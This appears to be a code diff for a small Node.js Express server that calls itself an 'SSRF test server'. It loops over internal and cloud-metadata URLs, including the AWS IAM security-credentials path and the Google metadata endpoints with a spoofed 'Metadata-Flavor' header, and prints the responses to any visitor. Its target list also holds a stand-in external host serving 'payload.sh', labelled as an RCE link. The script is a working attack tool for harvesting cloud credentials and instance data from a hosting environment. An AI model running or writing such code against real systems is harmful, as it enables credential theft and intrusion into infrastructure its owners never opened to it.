@@ -1,55 +1,58 @@
-const http = require('http');
-const express = require('express');
+const express = require("express");
+const axios = require("axios");
 const app = express();
-const PORT = process.env.PORT || 10000;
+
+const PORT = 10000;
 
 const targets = [
-  'http://127.0.0.1:80',
-  'http://localhost:3000',
-  'http://169.254.169.254',
-  'http://169.254.169.254/latest/meta-data/',
-  'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/contact.php',
-  'http://metadata.google.internal',
+  "http://169.254.169.254/latest/meta-data/",
+  "http://169.254.169.254/latest/user-data/",
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "http://metadata.google.internal/computeMetadata/v1/instance/id",
+  "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+  "http://localhost/",
+  "http://localhost:3000/",
+  "http://127.0.0.1/",
+  "http://127.0.0.1:5000/",
+  "http://127.0.0.1:8080/",
+  "http://internal/",
+  "http://internal.website/",
+  "http://docker.for.mac.localhost/",
+  "http://canarytokens.com/articles/YOUR-TOKEN/contact.php",
+  "http://your-external-server.com/payload.sh" // رابط RCE
 ];
 
-app.get('/', (req, res) => {
-  let index = 0;
-  let done = false;
+const headersList = [
+  {},
+  { "Metadata-Flavor": "Google" },
+  { "Host": "169.254.169.254" },
+];
 
-  function tryNext() {
-    if (index >= targets.length) {
-      if (!done) {
-        done = true;
-        return res.send('✅ Scanning finished.');
+app.get("/", async (req, res) => {
+  let results = [];
+
+  for (let url of targets) {
+    for (let headers of headersList) {
+      try {
+        console.log(`🚀 Trying: ${url}`);
+        const response = await axios.get(url, {
+          timeout: 3500,
+          headers: headers,
+          validateStatus: () => true,
+        });
+        const status = response.status;
+        console.log(`✅ Status ${status}: ${url}`);
+        results.push({ url, status, data: response.data });
+      } catch (error) {
+        console.log(`❌ FAILED: ${url} - ${error.message}`);
+        results.push({ url, error: error.message });
       }
-      return;
     }
-
-    const url = targets[index];
-    console.log(`🚀 Trying: ${url}`);
-    index++;
-
-    const request = http.get(url, (response) => {
-      console.log(`✅ SUCCESS: ${url} - Status: ${response.statusCode}`);
-      response.on('data', () => {});
-      response.on('end', tryNext);
-    });
-
-    request.on('error', (err) => {
-      console.log(`❌ FAILED: ${url} - ${err.message}`);
-      tryNext();
-    });
-
-    request.setTimeout(5000, () => {
-      console.log(`⏱️ TIMEOUT: ${url}`);
-      request.destroy();
-      tryNext();
-    });
   }
 
-  tryNext();
+  res.send(`<pre>${JSON.stringify(results, null, 2)}</pre>`);
 });
 
 app.listen(PORT, () => {
-  console.log(`🔥 Server running at http://localhost:${PORT}`);
+  console.log(`🔥 SSRF test server running on http://localhost:${PORT}`);
 });
